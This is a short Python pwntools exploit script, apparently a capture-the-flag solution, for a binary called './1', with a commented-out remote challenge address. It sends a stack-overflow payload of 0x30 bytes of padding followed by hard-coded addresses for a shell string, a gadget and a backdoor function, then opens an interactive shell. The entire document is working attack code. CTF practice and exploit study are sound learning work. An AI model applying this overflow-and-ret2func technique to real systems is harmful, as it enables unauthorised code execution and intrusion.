from pwn import*
# p=remote('8.130.110.158',2101)
context.log_level='debug'
p=process('./1')
elf=ELF('./1')
gdb.attach(p,'b *0x401273')
bd=0x4011E1
shell=0x402008
ret=0x40101a
retrdi=0x4012f3
a=0x401278
system=0x4040a8
payload=b'a'*0x30+p64(0x402008)+p64(0x401288)+p64(0x4011E1)
p.sendlineafter('However, what do you do if I lock the back door?\n',payload)
p.interactive()